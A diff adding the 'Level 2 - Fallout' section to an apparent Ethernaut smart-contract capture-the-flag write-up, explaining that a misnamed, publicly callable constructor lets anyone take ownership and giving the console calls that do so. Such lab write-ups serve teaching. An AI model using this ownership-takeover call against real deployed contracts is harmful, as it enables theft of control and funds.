@@ -33,3 +33,16 @@ await contract.withdraw();
 ```
 
 ## Level 2 - Fallout
+
+The contract does not correctly supply a constructor function. Instead a publicly callable function is set that allows anyone to call the function and take ownership of the contract.
+
+```
+// Get current contract owner
+await contract.owner();
+
+// Call the Fal1out() function
+await contract.Fal1out();
+
+// Get current contract owner
+await contract.owner();
+```
